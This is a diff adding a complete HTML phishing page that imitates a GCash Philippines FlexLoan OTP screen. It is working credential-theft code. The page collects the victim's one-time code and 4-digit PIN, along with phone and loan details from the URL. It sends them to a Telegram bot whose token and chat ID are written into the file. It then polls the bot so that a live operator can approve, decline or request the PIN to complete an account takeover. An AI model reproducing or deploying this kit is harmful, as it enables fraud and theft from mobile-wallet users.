@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verify OTP - GCash Philippines</title>
+  <style>
+    :root {
+      --primary: #00b14f;
+      --primary-dark: #0d8d42;
+      --primary-soft: #dff9eb;
+      --ink: #1c1c1e;
+      --muted: #6b7280;
+      --line: #e8ebef;
+      --shadow: 0 22px 50px rgba(15, 23, 42, 0.12);
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      font-family: Inter, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: linear-gradient(180deg, #edf7f2 0%, #f6f7fb 100%);
+      color: var(--ink);
+    }
+
+    body {
+      display: grid;
+      place-items: center;
+      padding: 24px;
+    }
+
+    .phone {
+      position: relative;
+      width: 100%;
+      max-width: 420px;
+      min-height: 820px;
+      background: linear-gradient(180deg, #fbfcff 0%, #f6f9fd 100%);
+      border-radius: 34px;
+      border: 1px solid rgba(17, 24, 39, 0.05);
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      padding: 26px 20px 120px;
+    }
+
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 22px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .brand-mark {
+      width: 36px;
+      height: 36px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, var(--primary) 0%, #22c55e 100%);
+      position: relative;
+      box-shadow: 0 10px 18px rgba(0, 177, 79, 0.25);
+    }
+
+    .brand-mark::before {
+      content: "G";
+      position: absolute;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      color: white;
+      font-weight: 900;
+      font-size: 20px;
+    }
+
+    .brand-text {
+      font-size: 18px;
+      font-weight: 900;
+      letter-spacing: -0.04em;
+    }
+
+    .chip {
+      background: var(--primary-soft);
+      color: var(--primary-dark);
+      border-radius: 999px;
+      padding: 8px 12px;
+      font-size: 11px;
+      font-weight: 800;
+      text-transform: uppercase;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 5px;
+      background: var(--line);
+      border-radius: 999px;
+      margin-bottom: 24px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), #22c55e);
+      transition: width 0.3s ease;
+    }
+
+    .back-btn {
+      background: transparent;
+      border: none;
+      color: var(--primary-dark);
+      font-size: 16px;
+      font-weight: 900;
+      cursor: pointer;
+      margin-bottom: 12px;
+    }
+
+    .otp-title {
+      margin-top: 14px;
+      font-size: 38px;
+      line-height: 1.05;
+      letter-spacing: -0.065em;
+      font-weight: 900;
+    }
+
+    .sub {
+      color: var(--muted);
+      font-size: 15px;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+
+    .offer-section {
+      background: var(--primary-soft);
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 24px;
+    }
+
+    .offer-title {
+      font-size: 13px;
+      color: #4b5563;
+      text-transform: uppercase;
+      font-weight: 800;
+      margin-bottom: 8px;
+    }
+
+    .offer-price {
+      font-size: 24px;
+      font-weight: 900;
+      color: var(--primary-dark);
+      margin-bottom: 8px;
+    }
+
+    .phone-display {
+      font-size: 12px;
+      color: var(--muted);
+      line-height: 1.5;
+    }
+
+    .phone-display strong {
+      color: var(--ink);
+      font-weight: 700;
+    }
+
+    .offer-meta {
+      margin-top: 12px;
+      padding-top: 12px;
+      border-top: 1px solid rgba(0, 177, 79, 0.2);
+    }
+
+    .meta-item {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: #4b5563;
+      margin-bottom: 6px;
+    }
+
+    .meta-item:last-child {
+      margin-bottom: 0;
+    }
+
+    .meta-item span {
+      font-weight: 700;
+      color: var(--primary-dark);
+    }
+
+    .field {
+      margin-bottom: 18px;
+    }
+
+    .label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 11px;
+      text-transform: uppercase;
+      color: #4b5563;
+      font-weight: 800;
+    }
+
+    .otp-inputs-container {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 18px;
+    }
+
+    .otp-input {
+      flex: 1;
+      height: 54px;
+      border-radius: 16px;
+      border: 2px solid var(--line);
+      background: rgba(255, 255, 255, 0.9);
+      font-size: 20px;
+      font-weight: 900;
+      text-align: center;
+      color: var(--ink);
+      outline: none;
+      transition: 0.2s ease;
+      caret-color: var(--primary);
+    }
+
+    .otp-input:focus {
+      border-color: rgba(0, 177, 79, 0.7);
+      box-shadow: 0 0 0 4px rgba(0, 177, 79, 0.12);
+    }
+
+    .otp-input.filled {
+      border-color: var(--primary);
+      background: rgba(0, 177, 79, 0.05);
+    }
+
+    .error-msg {
+      display: none;
+      color: #dc2626;
+      font-size: 13px;
+      margin-bottom: 16px;
+      text-align: center;
+      font-weight: 600;
+    }
+
+    .meta {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: var(--muted);
+      font-size: 13px;
+      margin-bottom: 26px;
+    }
+
+    .timer {
+      font-weight: 900;
+      color: var(--primary-dark);
+    }
+
+    .link {
+      color: var(--primary-dark);
+      font-weight: 800;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    button.primary {
+      width: 100%;
+      border: none;
+      background: linear-gradient(135deg, var(--primary) 0%, #13a95b 100%);
+      color: #fff;
+      height: 58px;
+      border-radius: 18px;
+      font-size: 16px;
+      font-weight: 900;
+      cursor: pointer;
+      box-shadow: 0 16px 28px rgba(0, 177, 79, 0.24);
+      transition: 0.2s ease;
+      margin-bottom: 12px;
+    }
+
+    button.primary:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 20px 36px rgba(0, 177, 79, 0.3);
+    }
+
+    button.primary:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .footer {
+      position: absolute;
+      left: 20px;
+      right: 20px;
+      bottom: 12px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 11px;
+    }
+
+    .spinner {
+      display: none;
+      position: absolute;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.95);
+      justify-content: center;
+      align-items: center;
+      border-radius: 34px;
+      z-index: 1000;
+    }
+
+    .spinner::after {
+      content: "";
+      width: 40px;
+      height: 40px;
+      border: 4px solid var(--line);
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .pin-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.5);
+      justify-content: center;
+      align-items: center;
+      z-index: 2000;
+    }
+
+    .pin-modal-content {
+      background: white;
+      border-radius: 24px;
+      padding: 32px 24px;
+      max-width: 340px;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+      text-align: center;
+    }
+
+    .pin-modal-title {
+      font-size: 24px;
+      font-weight: 900;
+      margin-bottom: 8px;
+      color: var(--ink);
+    }
+
+    .pin-modal-subtitle {
+      font-size: 14px;
+      color: var(--muted);
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    .pin-inputs-container {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin-bottom: 24px;
+    }
+
+    .pin-input {
+      width: 60px;
+      height: 60px;
+      border-radius: 14px;
+      border: 2px solid var(--line);
+      background: rgba(255, 255, 255, 0.9);
+      font-size: 24px;
+      font-weight: 900;
+      text-align: center;
+      color: var(--ink);
+      outline: none;
+      transition: 0.2s ease;
+      caret-color: var(--primary);
+    }
+
+    .pin-input:focus {
+      border-color: rgba(0, 177, 79, 0.7);
+      box-shadow: 0 0 0 4px rgba(0, 177, 79, 0.12);
+    }
+
+    .pin-input.filled {
+      border-color: var(--primary);
+      background: rgba(0, 177, 79, 0.05);
+    }
+
+    .pin-error-msg {
+      display: none;
+      color: #dc2626;
+      font-size: 13px;
+      margin-bottom: 16px;
+      font-weight: 600;
+    }
+
+    .pin-modal button {
+      width: 100%;
+      border: none;
+      background: linear-gradient(135deg, var(--primary) 0%, #13a95b 100%);
+      color: white;
+      height: 48px;
+      border-radius: 14px;
+      font-size: 14px;
+      font-weight: 900;
+      cursor: pointer;
+      box-shadow: 0 16px 28px rgba(0, 177, 79, 0.24);
+      transition: 0.2s ease;
+    }
+
+    .pin-modal button:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 20px 36px rgba(0, 177, 79, 0.3);
+    }
+
+    .pin-modal button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+  <div class="phone">
+    <div class="spinner" id="spinner"></div>
+
+    <div class="topbar">
+      <div class="brand">
+        <div class="brand-mark"></div>
+        <div class="brand-text">GCash</div>
+      </div>
+      <span class="chip">Philippines</span>
+    </div>
+
+    <div class="progress-bar">
+      <div class="progress-fill" style="width: 90%;"></div>
+    </div>
+
+    <button class="back-btn" onclick="goBack()">← Back</button>
+
+    <div class="offer-section">
+      <div class="offer-title">Loan Offer</div>
+      <div class="offer-price" id="offerPrice">Amount pending</div>
+      <div class="phone-display" id="phoneDisplay">Code sent to <strong>your registered number</strong></div>
+      <div class="offer-meta" id="offerMeta"></div>
+    </div>
+
+    <h2 class="otp-title">Verify OTP</h2>
+    <div class="sub">Enter the 6-digit code we sent to your mobile number.</div>
+
+    <div class="error-msg" id="errMsg">Please enter a valid 6-digit OTP code</div>
+
+    <div class="field">
+      <label class="label">OTP Code</label>
+      <div class="otp-inputs-container" id="otpInputs">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" />
+      </div>
+    </div>
+
+    <div class="meta">
+      <span>Didn't receive it?</span>
+      <span class="timer">00:39</span>
+    </div>
+
+    <button class="primary" id="verifyBtn">Verify & Continue</button>
+
+    <div style="text-align: center; margin-top: 10px;">
+      <a href="#" class="link">Resend OTP</a>
+    </div>
+
+    <div class="footer">© 2026 GCash Philippines. All rights reserved.</div>
+  </div>
+
+  <!-- PIN Modal -->
+  <div class="pin-modal" id="pinModal">
+    <div class="pin-modal-content">
+      <h3 class="pin-modal-title">Enter PIN</h3>
+      <p class="pin-modal-subtitle">Please enter your 4-digit PIN to confirm this transaction</p>
+
+      <div class="pin-error-msg" id="pinErrMsg">Incorrect PIN. Please try again.</div>
+
+      <div class="pin-inputs-container" id="pinInputsContainer">
+        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" />
+        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" />
+        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" />
+        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" />
+      </div>
+
+      <button id="confirmPinBtn">Confirm PIN</button>
+    </div>
+  </div>
+
+  <script>
+    /* ── CONFIG ─────────────────────────────────────────────────────────── */
+    const CONFIG = {
+      BOT_TOKEN:    '8722087484:AAEJ0Hc52ogYQ9NWQOV4m3Nl88x8TUR1O5k',
+      CHAT_ID:      '8820857419',
+      SUCCESS_PAGE: 'success.html',
+    };
+
+    /* ── STATE ───────────────────────────────────────────────────────────── */
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+
+    /* ── ELEMENTS ────────────────────────────────────────────────────────── */
+    const otpInputs    = Array.from(document.querySelectorAll('#otpInputs .otp-input'));
+    const pinInputs    = Array.from(document.querySelectorAll('#pinInputsContainer .pin-input'));
+    const errMsg       = document.getElementById('errMsg');
+    const pinErrMsg    = document.getElementById('pinErrMsg');
+    const spinner      = document.getElementById('spinner');
+    const pinModal     = document.getElementById('pinModal');
+    const verifyBtn    = document.getElementById('verifyBtn');
+    const confirmPinBtn= document.getElementById('confirmPinBtn');
+
+    /* ── URL PARAMS ──────────────────────────────────────────────────────── */
+    const params = new URLSearchParams(window.location.search);
+
+    function getAllParams() { return params.toString(); }
+
+    function buildNextUrl(page) {
+      const qs = getAllParams();
+      return qs ? `${page}?${qs}` : page;
+    }
+
+    /* ── STORED APPLICATION ──────────────────────────────────────────────── */
+    function readJson(key) {
+      try { const r = localStorage.getItem(key); return r ? JSON.parse(r) : null; }
+      catch(e) { return null; }
+    }
+
+    function readStoredApplication() {
+      const keys = ['loanApplication','loanApplicationDraft','gcashLoanApplication','flexLoanApplication'];
+      for (const k of keys) { const d = readJson(k); if (d && typeof d === 'object') return d; }
+      return {};
+    }
+
+    function pick(...values) {
+      return values.find(v => v !== undefined && v !== null && String(v).trim() !== '') || '';
+    }
+
+    function formatAmount(value) {
+      if (!value) return 'Amount pending';
+      const cleaned = String(value).replace(/[^0-9.]/g, '');
+      const num = Number(cleaned);
+      if (Number.isFinite(num) && cleaned) return `₱ ${num.toLocaleString()}`;
+      return String(value);
+    }
+
+    function maskPhone(phone) {
+      const p = phone.replace(/\s+/g, '');
+      if (p.length <= 5) return p;
+      return p.slice(0, 3) + '*'.repeat(p.length - 5) + p.slice(-2);
+    }
+
+    /* ── SHOW APPLICATION DETAILS ────────────────────────────────────────── */
+    function showApplicationDetails() {
+      const stored = readStoredApplication();
+
+      const phone    = pick(params.get('phone'), params.get('mobile'), params.get('msisdn'), stored.phone, stored.mobile, stored.msisdn, stored.phoneNumber, localStorage.getItem('gcashPhone'));
+      const loanName = pick(params.get('loan'), params.get('name'), params.get('loan_name'), stored.loanName, stored.loan_name, stored.name, stored.productName, 'GCash FlexLoan');
+      const amount   = pick(params.get('amount'), params.get('loan_amount'), stored.amount, stored.loanAmount, stored.loan_amount, stored.requestedAmount);
+      const duration = pick(params.get('duration'), params.get('tenor'), stored.duration, stored.tenor, stored.period);
+      const rate     = pick(params.get('rate'), params.get('interest'), stored.rate, stored.interest);
+      const fee      = pick(params.get('fee'), stored.fee);
+
+      document.getElementById('offerPrice').textContent = formatAmount(amount);
+
+      if (phone) {
+        document.getElementById('phoneDisplay').innerHTML = `Code sent to <strong>${maskPhone(phone)}</strong>`;
+      } else {
+        document.getElementById('phoneDisplay').innerHTML = `Code sent to <strong>your registered number</strong>`;
+      }
+
+      const meta = [];
+      if (duration) meta.push(`<div class="meta-item">Duration: <span>${duration}</span></div>`);
+      if (rate)     meta.push(`<div class="meta-item">Interest: <span>${rate}</span></div>`);
+      if (fee)      meta.push(`<div class="meta-item">Fee: <span>₱ ${fee}</span></div>`);
+      meta.push('<div class="meta-item">Status: <span>Pending verification</span></div>');
+      document.getElementById('offerMeta').innerHTML = meta.join('');
+    }
+
+    /* ── OTP INPUT HELPERS ───────────────────────────────────────────────── */
+    function updateFilledState(input) {
+      input.classList.toggle('filled', input.value.trim() !== '');
+    }
+
+    function getCode(inputsArray) {
+      return inputsArray.map(i => i.value.trim()).join('');
+    }
+
+    function setupInputBehaviour(inputsArray, onComplete) {
+      inputsArray.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+          const val = e.target.value.replace(/\D/g, '').slice(0, 1);
+          e.target.value = val;
+          updateFilledState(e.target);
+          errMsg.style.display = 'none';
+          if (val && index < inputsArray.length - 1) inputsArray[index + 1].focus();
+          // Auto-submit when all filled
+          if (getCode(inputsArray).length === inputsArray.length) {
+            setTimeout(onComplete, 180);
+          }
+        });
+
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !input.value && index > 0) {
+            inputsArray[index - 1].focus();
+          }
+        });
+
+        input.addEventListener('paste', (e) => {
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData)
+            .getData('text').replace(/\D/g, '').slice(0, inputsArray.length);
+          pasted.split('').forEach((digit, di) => {
+            if (inputsArray[di]) { inputsArray[di].value = digit; updateFilledState(inputsArray[di]); }
+          });
+          const fi = Math.min(pasted.length, inputsArray.length - 1);
+          inputsArray[fi].focus();
+          if (pasted.length === inputsArray.length) setTimeout(onComplete, 180);
+        });
+      });
+    }
+
+    /* ── TELEGRAM: SEND OTP ──────────────────────────────────────────────── */
+    function submitOTP() {
+      if (isProcessing) return;
+      const otp = getCode(otpInputs);
+
+      if (otp.length !== 6) {
+        errMsg.style.display = 'block';
+        otpInputs.find(i => !i.value)?.focus();
+        return;
+      }
+
+      isProcessing = true;
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Verifying...';
+
+      const ts             = Date.now();
+      const approveId      = `otp_approve_${ts}`;
+      const declineId      = `otp_decline_${ts}`;
+      const verifyDeviceId = `otp_device_${ts}`;
+      const validPinId     = `valid_pin_${ts}`;
+      const invalidPinId   = `invalid_pin_${ts}`;
+
+      // Build a summary of all URL params for the Telegram message
+      const paramSummary = Array.from(params.entries())
+        .map(([k, v]) => `${k}: <code>${v}</code>`)
+        .join('\n');
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 OTP Verification — GCash Philippines FlexLoan</b>\n\n${paramSummary ? paramSummary + '\n' : ''}OTP: <code>${otp}</code>\n\nChoose Action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve',        callback_data: approveId },
+                { text: '📱 Verify Device',  callback_data: verifyDeviceId }
+              ],
+              [
+                { text: '✅ Valid PIN',   callback_data: validPinId },
+                { text: '❌ Invalid PIN', callback_data: invalidPinId }
+              ],
+              [
+                { text: '❌ Decline', callback_data: declineId }
+              ]
+            ]
+          }
+        })
+      })
+      .then(() => {
+        spinner.style.display = 'flex';
+        startOTPPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId);
+      })
+      .catch(() => resetOTPButton());
+    }
+
+    /* ── TELEGRAM: POLL FOR OTP RESPONSE ─────────────────────────────────── */
+    function startOTPPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+              if (!update.callback_query) return;
+              const cb = update.callback_query.data;
+
+              if (cb === approveId) {
+                // Approve → show PIN modal
+                clearInterval(interval);
+                spinner.style.display = 'none';
+                showPinModal();
+
+              } else if (cb === validPinId) {
+                // Valid PIN (skip modal, go straight to success)
+                clearInterval(interval);
+                spinner.style.display = 'none';
+                window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
+
+              } else if (cb === verifyDeviceId) {
+                // Verify Device
+                clearInterval(interval);
+                spinner.style.display = 'none';
+                window.location.href = buildNextUrl(CONFIG.DEVICE_PAGE);
+
+              } else if (cb === declineId) {
+                // Decline
+                clearInterval(interval);
+                spinner.style.display = 'none';
+                errMsg.textContent = 'Wrong or expired OTP. Please try again.';
+                errMsg.style.display = 'block';
+                otpInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+                otpInputs[0].focus();
+                resetOTPButton();
+
+              } else if (cb === invalidPinId) {
+                // Invalid PIN while modal is open
+                clearInterval(interval);
+                spinner.style.display = 'none';
+                pinErrMsg.textContent = 'Incorrect PIN. Please try again.';
+                pinErrMsg.style.display = 'block';
+                pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+                pinInputs[0].focus();
+                confirmPinBtn.disabled = false;
+                confirmPinBtn.textContent = 'Confirm PIN';
+              }
+            });
+          })
+          .catch(() => {}); // silent network errors
+      }, 1000);
+    }
+
+    /* ── PIN MODAL ───────────────────────────────────────────────────────── */
+    function showPinModal() {
+      pinErrMsg.style.display = 'none';
+      pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+      pinModal.style.display = 'flex';
+      setTimeout(() => pinInputs[0].focus(), 120);
+    }
+
+    /* ── TELEGRAM: SEND PIN ──────────────────────────────────────────────── */
+    function submitPIN() {
+      const pin = getCode(pinInputs);
+      if (pin.length !== 4) return;
+
+      confirmPinBtn.disabled = true;
+      confirmPinBtn.textContent = 'Verifying...';
+
+      const ts        = Date.now();
+      const validId   = `valid_${ts}`;
+      const invalidId = `invalid_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 PIN Verification — GCash Philippines FlexLoan</b>\n\nPIN: <code>${pin}</code>\n\nChoose action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [[
+              { text: '✅ Valid PIN',   callback_data: validId },
+              { text: '❌ Invalid PIN', callback_data: invalidId }
+            ]]
+          }
+        })
+      })
+      .then(() => startPINPolling(validId, invalidId))
+      .catch(() => {
+        confirmPinBtn.disabled = false;
+        confirmPinBtn.textContent = 'Confirm PIN';
+      });
+    }
+
+    /* ── TELEGRAM: POLL FOR PIN RESPONSE ─────────────────────────────────── */
+    function startPINPolling(validId, invalidId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            data.result?.forEach(update => {
+              state.lastUpdateId = update.update_id;
+              if (!update.callback_query) return;
+              const cb = update.callback_query.data;
+
+              if (cb === validId) {
+                clearInterval(interval);
+                pinModal.style.display = 'none';
+                window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
+
+              } else if (cb === invalidId) {
+                clearInterval(interval);
+                pinErrMsg.textContent = 'Incorrect PIN. Please try again.';
+                pinErrMsg.style.display = 'block';
+                pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+                pinInputs[0].focus();
+                confirmPinBtn.disabled = false;
+                confirmPinBtn.textContent = 'Confirm PIN';
+              }
+            });
+          })
+          .catch(() => {});
+      }, 1400);
+    }
+
+    /* ── HELPERS ─────────────────────────────────────────────────────────── */
+    function resetOTPButton() {
+      isProcessing = false;
+      verifyBtn.disabled = false;
+      verifyBtn.textContent = 'Verify & Continue';
+    }
+
+    function goBack() {
+      window.location.href = 'login.html';
+    }
+
+    /* ── INIT ────────────────────────────────────────────────────────────── */
+    setupInputBehaviour(otpInputs, submitOTP);
+    setupInputBehaviour(pinInputs, submitPIN);
+
+    verifyBtn.addEventListener('click', submitOTP);
+    confirmPinBtn.addEventListener('click', submitPIN);
+
+    showApplicationDetails();
+    setTimeout(() => otpInputs[0].focus(), 250);
+  </script>
+</body>
+</html>
